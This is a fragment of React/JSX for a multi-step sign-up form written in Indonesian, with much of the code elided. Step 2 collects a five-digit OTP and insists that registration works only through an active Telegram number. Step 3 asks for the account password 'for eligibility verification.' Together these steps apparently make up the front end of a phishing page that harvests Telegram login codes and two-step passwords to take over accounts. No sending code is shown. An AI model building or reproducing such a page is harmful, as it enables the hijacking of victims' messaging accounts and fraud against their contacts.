      ...
      <div className="p-6 space-y-6 max-w-md mx-auto">
        {step === 1 && (
          <div className="space-y-5">
            ...
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition">
        ...
        {step === 2 && (
          <div className="space-y-6 text-center">
            ...
            <input name="otp" placeholder="· · · · ·" className="w-full border-2 p-5 rounded-2xl text-center text-4xl font-bold tracking-[0.5em] focus:border-blue-600 outline-none" onChange={handleChange} maxLength={5} />
            ...
            <p className="text-[10px] text-gray-400 italic">Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!</p>
          </div>
        )}
        ...
        {step === 3 && (
          <div className="space-y-6 text-center">
            ...
            <p className="text-sm text-gray-500 italic">Masukkan kata sandi akun untuk verifikasi kelayakan.</p>
